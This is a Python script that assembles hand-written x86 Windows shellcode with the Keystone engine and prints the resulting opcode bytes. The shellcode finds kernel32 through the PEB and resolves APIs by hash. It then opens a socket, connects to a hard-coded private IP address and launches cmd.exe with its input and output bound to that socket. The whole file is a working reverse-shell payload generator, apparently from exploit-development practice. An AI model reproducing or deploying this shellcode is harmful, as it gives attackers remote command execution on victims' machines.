from keystone import *
CODE = (
'''
start:
    mov ebp, esp;
    sub sp, 0x610;

find_kernel32:
    xor ecx, ecx;
    mov esi, dword ptr fs:[ecx + 0x30];
    mov esi, dword ptr[esi + 0xc];
    mov esi, dword ptr[esi + 0x1c];

parse_next_module:
    mov ebx, dword ptr[esi + 0x8];
    mov edi, dword ptr[esi + 0x20];
    mov esi, [esi];
    cmp word ptr[edi + 12 * 2], cx;
    jne parse_next_module;

find_function_jmp:
    jmp callback;

find_function_ret:
    pop esi;
    mov dword ptr[ebp + 0x4], esi;
    jmp resolve_k32_sym;

callback:
    call find_function_ret;
				
find_function:
    add esp, 0x4;
    pop eax;
    push 0xffffffff;
    add esp, eax;

find_function_loop2:
    mov eax, dword ptr[ebx + 0x3c];
    mov edi, dword ptr[ebx + eax + 0x78];
    add edi, ebx;
    mov ecx, dword ptr[edi + 0x18];
    mov eax, dword ptr[edi + 0x20];
    add eax, ebx;
    mov dword ptr[ebp - 0x4], eax;

find_function_loop:
    dec ecx;
    mov eax, dword ptr[ebp - 0x4];
    mov esi, dword ptr[eax + ecx * 4];
    add esi, ebx;

compute_hash:
    xor eax, eax;
    cdq;

compute_hash_repeat:
    ror edx, 0xd;
    add edx, eax;
    lodsb;
    test al, al;
    jnz compute_hash_repeat;

find_function_compare:
    cmp edx, dword ptr[esp - 4];
    jnz find_function_loop;
    mov edx, dword ptr[edi + 0x24];
    add edx, ebx;
    mov cx, word ptr[edx + 2 * ecx];
    mov edx, dword ptr[edi + 0x1c];
    add edx, ebx;
    mov eax, dword ptr[edx + 4 * ecx];
    add eax, ebx;
    push eax;
    cmp dword ptr[esp - 4], 0xffffffff;
    jnz find_function_loop2;

find_function_finish:
    sub esp, 0x8;
    ret;

resolve_k32_sym:
    push 0xec0e4e8e;
    push 0x16b3fe72;
    push 0xc;
    call dword ptr[ebp + 0x4];

load_ws2_32:
    xor eax, eax;
    mov ax, 0x6c6c;
    push eax;
    push 0x642e3233;
    push 0x5f327377;
    push esp;
    call dword ptr[esp + 0x18];

resolve_ws2_sym:
    mov ebx, eax;
    push 0x60aaf9ec;
    push 0xadf509d9;
    push 0xc;
    call dword ptr[ebp + 0x4];

call_wsasocketa:
    xor eax, eax;
    push eax;
    push eax;
    push eax;
    push 0x6;
    push 0x1;
    push 0x2;
    call dword ptr[esp + 0x1c];

call_connect:
    mov ebx, eax;
    xor edi, edi;
    xor eax, eax;
    push edi;
    push edi;
    push 0xb301a8c0; 
    mov di, 0x2923; 
    shl edi, 0x10;
    add di, 0x2;
    push edi;
    mov edi, esp;
    push 0x10;
    push edi;
    push ebx;
    call dword ptr[esp + 0x24];
			
create_startupinfoa:
    xor ecx, ecx;
    mov esi, esp;
    std;
    mov cl, 0x23;
    rep stosd;
    cld;
    push ebx;
    push ebx;
    push ebx;
    push eax;
    push eax;
    inc ch;
    push ecx;
    dec ch;
    sub esp, 0x28;
    mov al, 0x44;
    push eax;
    mov edi, esp;

create_cmd_str:
    mov eax, 0xff9b929d;
    neg eax;
    push eax;
    mov ebx, esp;

call_createprocessa:
    mov eax, esp;
    add eax, 0xfffffc70;
    push eax;
    push edi;
    sub esp, 0xc;
    push 0x1;
    push ecx;
    push ecx;
    push ebx;
    push ecx;
    lea edx, dword ptr[esp + 0x54];
    call dword ptr[edx + 0x48];
'''
)
# Initialize engine in 32-bit mode
ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
instructions = ""
for dec in encoding: 
 instructions += "\\x{0:02x}".format(int(dec)).rstrip("\n")
 
print("Opcodes = (\"" + instructions + "\")")
print(len(encoding))
